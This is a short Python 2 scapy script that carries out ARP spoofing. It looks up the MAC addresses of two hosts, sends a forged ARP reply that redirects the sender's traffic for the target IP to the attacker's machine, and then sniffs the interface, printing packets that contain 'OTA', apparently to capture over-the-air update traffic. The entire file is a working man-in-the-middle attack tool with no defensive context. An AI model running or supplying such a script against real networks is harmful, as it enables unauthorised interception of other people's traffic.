from scapy.all import *
import sys

BLOADCASTMAC = "ff:ff:ff:ff:ff:ff"
UNKNOWNMAC = "00:00:00:00:00:00"

InterFace = sys.argv[1]
SenderIp = sys.argv[2]
TargetIp = sys.argv[3]

print "arp spoofing " + sys.argv[2] + " to " + sys.argv[3] + " start!!"

MyMac = get_if_hwaddr(InterFace)
MyIp = get_if_addr(InterFace)

print "My Mac Addr is " + MyMac

def findMacAddr():
    global SenderMac
    #arppkt = Ether(dst = BLOADCASTMAC, src = MyMac)/ARP(op=ARP.who_has, hwsrc=MyMac, psrc=MyIp, hwdst=UNKNOWNMAC, pdst=SenderIp)
    #p = srp1(arppkt, iface=InterFace)

    p = arping(SenderIp, iface = InterFace)
    rep = p[0][0][1]
    SenderMac = rep[ARP].hwsrc

    global TargetMac
    p = arping(TargetIp, iface = InterFace)
    rep = p[0][0][1]
    TargetMac = rep[ARP].hwsrc

    print "Sender Mac Addr is " + SenderMac
    print "Target Mac Addr is " + TargetMac

def poison(sIp, tIp, sMac):
    arppkt = Ether(dst = sMac, src = MyMac)/ARP(op=ARP.is_at, hwsrc=MyMac, psrc=tIp, hwdst=sMac, pdst=sIp)
    sendp(arppkt)

def cb(pkt):
    if "OTA" in str(pkt):
        print "##################################################"
        print "OTA!!!"
        print str(pkt)
        print "##################################################"


findMacAddr()

raw_input(">")
poison(SenderIp, TargetIp, SenderMac)

sniff(iface=InterFace, prn=cb)
